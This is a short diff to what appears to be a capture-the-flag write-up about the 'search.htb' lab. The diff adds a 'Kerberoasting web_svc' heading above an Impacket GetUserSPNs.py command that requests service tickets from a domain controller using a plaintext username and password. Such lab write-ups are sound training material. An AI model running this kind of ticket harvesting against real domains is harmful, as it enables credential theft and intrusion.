@@ -160,6 +160,8 @@ We would first have to make our way to any of users on the left within the `ITSE
 
 ![web-svc-kerberoastable](web-svc-kerberoastable.jpg)
 
+### Kerberoasting `web_svc`
+
 **Command:** `python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'`
 
 ![kerberoasted](kerberoasted.jpg)
